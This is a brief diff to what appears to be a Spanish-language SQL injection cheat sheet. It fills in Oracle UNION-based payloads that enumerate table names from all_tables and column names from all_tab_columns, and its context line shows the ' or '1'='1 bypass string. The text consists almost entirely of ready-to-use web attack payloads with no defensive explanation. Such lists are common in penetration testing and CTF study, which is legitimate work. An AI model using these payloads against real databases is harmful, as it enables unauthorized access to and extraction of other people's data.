@@ -40,7 +40,7 @@ abc' or '1'='1
 ```
 #### Oracle
 ```sql
-
+' union select null,table_name from all_tables-- -
 ```
 ### Columnas
 #### Non-Oracle
@@ -49,7 +49,7 @@ abc' or '1'='1
 ```
 #### Oracle
 ```sql
-
+' union select null,column_name from all_tab_columns where table_name='NOMBRE DE LA TABLA'-- -
 ```
 
 
